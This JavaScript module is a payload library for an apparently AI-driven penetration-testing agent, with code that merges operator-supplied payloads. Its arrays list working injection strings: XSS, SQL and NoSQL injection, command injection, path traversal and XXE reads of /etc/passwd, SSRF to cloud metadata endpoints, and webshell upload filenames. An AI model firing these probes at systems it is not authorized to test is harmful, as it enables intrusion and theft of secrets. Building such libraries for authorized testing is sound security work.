// Web-vulnerability DETECTION payload library (authorized pentest use).
//
// These are non-destructive probe strings — the kind shipped with Burp,
// OWASP ZAP, Nuclei and PayloadsAllTheThings — used to DETECT whether an
// input is injectable, not to damage a system. The agent pulls from here via
// the `payloads` tool and then applies them with http_probe / run_command,
// which stay gated by scope.mjs (Rules of Engagement) and policy.mjs. Nothing
// here is executed by loading this file.
//
// Deliberately EXCLUDED: destructive SQL (DROP/DELETE/UPDATE/TRUNCATE),
// reverse shells, data exfiltration, DoS/ReDoS/fork bombs, and detection-
// evasion tuned for abuse. Use only against targets you are authorized to test.
//
// Marker convention: unique tokens like `pENTx` / `9173` make a reflected
// probe easy to confirm in the response without false positives.

/** @type {Record<string, string[]>} */
export const PAYLOADS = {
  // --- Reflected / stored XSS detection (look for the marker echoed unescaped) ---
  xss: [
    "<script>alert(9173)</script>",
    "<ScRiPt>alert(9173)</ScRiPt>",
    "\"><script>alert(9173)</script>",
    "'><script>alert(9173)</script>",
    "<img src=x onerror=alert(9173)>",
    "<svg onload=alert(9173)>",
    "<svg/onload=alert(9173)>",
    "<body onload=alert(9173)>",
    "<iframe src=javascript:alert(9173)>",
    "<a href=javascript:alert(9173)>x</a>",
    "javascript:alert(9173)",
    "<details open ontoggle=alert(9173)>",
    "<marquee onstart=alert(9173)>",
    "<input autofocus onfocus=alert(9173)>",
    "<select autofocus onfocus=alert(9173)>",
    "<video><source onerror=alert(9173)>",
    "<audio src=x onerror=alert(9173)>",
    "\"><img src=x onerror=alert(9173)>",
    "'-alert(9173)-'",
    "\";alert(9173);//",
    "</title><script>alert(9173)</script>",
    "</textarea><script>alert(9173)</script>",
    "<svg><animate onbegin=alert(9173) attributeName=x dur=1s>",
    "<math><mtext><script>alert(9173)</script>",
    "pENTx<script>alert(9173)</script>pENTx",
    "<x onclick=alert(9173)>click",
    "%3Cscript%3Ealert(9173)%3C/script%3E",
    "&lt;script&gt;alert(9173)&lt;/script&gt;",
    "<img src=1 href=1 onerror=\"javascript:alert(9173)\">",
    "<body background=javascript:alert(9173)>",
    "<table background=javascript:alert(9173)>",
    "\"><svg/onload=alert(/9173/)>",
  ],

  // --- SQL injection detection (quote-breaking, boolean, UNION probe, modest
  //     time-based). No data-mutating statements. ---
  sqli: [
    "'",
    "\"",
    "`",
    "')",
    "\"))",
    "' OR '1'='1",
    "' OR '1'='1'-- -",
    "\" OR \"1\"=\"1",
    "' OR 1=1-- -",
    "') OR ('1'='1",
    "' OR 'a'='a",
    "admin'-- -",
    "admin'#",
    "' AND '1'='2",
    "' AND 1=2-- -",
    "1' ORDER BY 1-- -",
    "1' ORDER BY 10-- -",
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SLEEP(5)-- -",
    "\" AND SLEEP(5)-- -",
    "1) AND SLEEP(5)-- -",
    "';WAITFOR DELAY '0:0:5'-- -",
    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
    "' OR pg_sleep(5)-- -",
    "' AND extractvalue(1,concat(0x7e,version()))-- -",
    "' AND updatexml(1,concat(0x7e,version()),1)-- -",
    "1' AND '1'='1",
    "%27",
    "1%27%20OR%201=1--%20-",
    "' OR SLEEP(5)#",
  ],

  // --- NoSQL (Mongo-style) auth-bypass / operator injection detection ---
  nosql: [
    "' || '1'=='1",
    "'; return true; var x='",
    "{\"$gt\":\"\"}",
    "{\"$ne\":null}",
    "{\"$ne\":\"\"}",
    "{\"$regex\":\".*\"}",
    "{\"$where\":\"sleep(100)\"}",
    "[$ne]=1",
    "username[$ne]=&password[$ne]=",
    "{\"$gt\":0}",
    "';sleep(100);'",
    "{\"$exists\":true}",
  ],

  // --- Path traversal / LFI detection (read well-known files) ---
  path_traversal: [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd%00",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "file:///etc/passwd",
    "....\\\\....\\\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%afetc/passwd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "/var/log/apache2/access.log",
    "/etc/hosts",
  ],

  // --- OS command injection DETECTION (benign info commands only) ---
  command_injection: [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "& whoami",
    "\n id \n",
    "%0aid",
    "; uname -a",
    "| uname -a",
    "$(sleep 5)",
    "; sleep 5",
    "| sleep 5",
    "& ping -n 3 127.0.0.1 &",
    "; echo pENTx-$(id)-pENTx",
    "`echo pENTx`",
  ],

  // --- Server-side template injection detection (arithmetic markers) ---
  ssti: [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "${{7*7}}",
    "#{ 7 * 7 }",
    "{{ '7'*7 }}",
    "@(7*7)",
    "{{7*7}}${7*7}",
    "*{7*7}",
    "~{7*7}",
    "{{config}}",
    "{{self}}",
    "${T(java.lang.System).getenv()}",
  ],

  // --- Client-side template injection (Angular/Vue sandbox markers) ---
  csti: [
    "{{constructor.constructor('alert(9173)')()}}",
    "{{$on.constructor('alert(9173)')()}}",
    "{{7*7}}",
    "[[7*7]]",
    "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1')}}",
  ],

  // --- SSRF detection (canary/internal URLs; use your own collaborator host) ---
  ssrf: [
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://[::1]/",
    "http://127.0.0.1:22/",
    "http://0.0.0.0/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1%2f",
    "http://2130706433/",
    "http://0177.0.0.1/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_PING",
    "dict://127.0.0.1:11211/stats",
  ],

  // --- Open redirect detection ---
  open_redirect: [
    "//example.com",
    "https://example.com",
    "/\\example.com",
    "//example.com/%2f..",
    "https:example.com",
    "/%0a/example.com",
    "////example.com",
    "https://evil.example.com@trusted.local",
    "//google.com/%2e%2e",
    "/redirect?url=//example.com",
  ],

  // --- CRLF / HTTP response splitting & header injection detection ---
  crlf: [
    "%0d%0aSet-Cookie:pentest=9173",
    "%0d%0aX-Injected:9173",
    "\\r\\nX-Injected:9173",
    "%0aX-Injected:9173",
    "%E5%98%8A%E5%98%8DX-Injected:9173",
    "test%0d%0aLocation:https://example.com",
    "%23%0d%0aSet-Cookie:x=9173",
    "a%0d%0aContent-Length:0",
  ],

  // --- XXE detection (non-destructive external entity / file read) ---
  xxe: [
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x \"pENTx\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>",
    "<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><foo>&xxe;</foo>",
    "<!DOCTYPE r [<!ENTITY % p SYSTEM \"file:///etc/passwd\"> %p;]>",
  ],

  // --- LDAP injection detection ---
  ldap: [
    "*",
    "*)(uid=*",
    "*)(|(uid=*))",
    "*)(&(uid=*)",
    "admin)(&)",
    "*))%00",
    ")(cn=*",
    "*)(objectClass=*",
  ],

  // --- XPath injection detection ---
  xpath: [
    "' or '1'='1",
    "'] | //user/*[contains(*,'",
    "' or 1=1 or ''='",
    "x'] | //*[1] | ['",
    "count(//user)",
    "' and string-length(name(/*[1]))>0 and ''='",
  ],

  // --- Risky upload filenames / extensions (detection of weak filters) ---
  file_upload: [
    "shell.php",
    "shell.php.jpg",
    "shell.php%00.jpg",
    "shell.pHp",
    "shell.phtml",
    "shell.php5",
    "shell.asp;.jpg",
    "shell.aspx",
    "shell.jsp",
    "../shell.php",
    "shell.svg",
    "shell.html",
  ],

  // --- Test request headers that often change behavior / reveal trust issues ---
  headers: [
    "X-Forwarded-For: 127.0.0.1",
    "X-Forwarded-Host: example.com",
    "X-Original-URL: /admin",
    "X-Rewrite-URL: /admin",
    "X-Custom-IP-Authorization: 127.0.0.1",
    "X-Forwarded-Proto: http",
    "Referer: https://example.com",
    "Origin: https://evil.example.com",
    "Host: example.com",
    "X-Host: example.com",
    "Content-Type: application/json",
    "X-HTTP-Method-Override: PUT",
  ],

  // --- GraphQL probing (introspection / shape discovery) ---
  graphql: [
    "{__schema{types{name}}}",
    "{__typename}",
    "query{__schema{queryType{name}}}",
    "{__schema{mutationType{fields{name}}}}",
  ],

  // --- Generic fuzz / boundary markers (encoding, truncation, format) ---
  fuzz: [
    "pENTx9173",
    "%00",
    "%0a",
    "%0d",
    "%09",
    "../",
    "..\\",
    "${pENTx}",
    "{{pENTx}}",
    "'\"<>()",
    "A".repeat(1024),
    "-1",
    "0",
    "99999999999",
    "null",
    "undefined",
    "true",
    "NaN",
    "%ff%fe",
    "\u202e",
  ],
};

import { CUSTOM_PAYLOADS } from "./custom.mjs";

/**
 * Merge the operator's custom payloads (custom.mjs) into the built-in set.
 * Robust to mistakes: non-string entries and blanks are dropped, duplicates
 * removed, so a typo in custom.mjs can never crash the engine. Custom entries
 * append after the built-ins within each category; brand-new categories appear
 * too. This runs at import time, so added payloads are live immediately.
 */
function mergeCustom(base, custom) {
  const out = {};
  for (const [cat, list] of Object.entries(base)) out[cat] = [...list];
  if (custom && typeof custom === "object") {
    for (const [cat, list] of Object.entries(custom)) {
      if (!Array.isArray(list)) continue;
      const clean = list.filter((p) => typeof p === "string" && p.trim() !== "");
      if (clean.length === 0 && !out[cat]) continue; // skip empty brand-new category
      out[cat] = [...(out[cat] ?? []), ...clean];
    }
  }
  // De-duplicate within each category.
  for (const cat of Object.keys(out)) out[cat] = [...new Set(out[cat])];
  return out;
}

/** Built-in + custom payloads, merged. This is what the tool serves. */
export const ALL_PAYLOADS = mergeCustom(PAYLOADS, CUSTOM_PAYLOADS);

/** All category names (built-in + custom). */
export const CATEGORIES = Object.keys(ALL_PAYLOADS);

/** Total payload count across all categories. */
export const PAYLOAD_COUNT = Object.values(ALL_PAYLOADS).reduce((n, a) => n + a.length, 0);

/**
 * Fetch payloads for the agent. Read-only: returns strings, runs nothing.
 * @param {{ category?: string, limit?: number }} [opts]
 * @returns {{ ok: boolean, category: string, count: number, total: number, payloads?: string[], categories?: string[], message?: string }}
 */
export function getPayloads({ category, limit } = {}) {
  const cat = typeof category === "string" ? category.trim().toLowerCase() : "";
  const cap = Number.isInteger(limit) && limit > 0 ? limit : 50;

  if (!cat || cat === "all" || cat === "list") {
    // No/"all" category: return the catalog so the model can choose.
    return {
      ok: true,
      category: "list",
      count: CATEGORIES.length,
      total: PAYLOAD_COUNT,
      categories: CATEGORIES.map((c) => `${c} (${ALL_PAYLOADS[c].length})`),
      message: `Payload library: ${PAYLOAD_COUNT} detection probes across ${CATEGORIES.length} categories. ` +
        `Call again with a category to get the probes. Authorized, in-scope testing only.`,
    };
  }

  const list = ALL_PAYLOADS[cat];
  if (!list) {
    return { ok: false, category: cat, count: 0, total: PAYLOAD_COUNT, message: `Unknown category "${cat}". Available: ${CATEGORIES.join(", ")}.` };
  }
  return { ok: true, category: cat, count: Math.min(cap, list.length), total: list.length, payloads: list.slice(0, cap) };
}
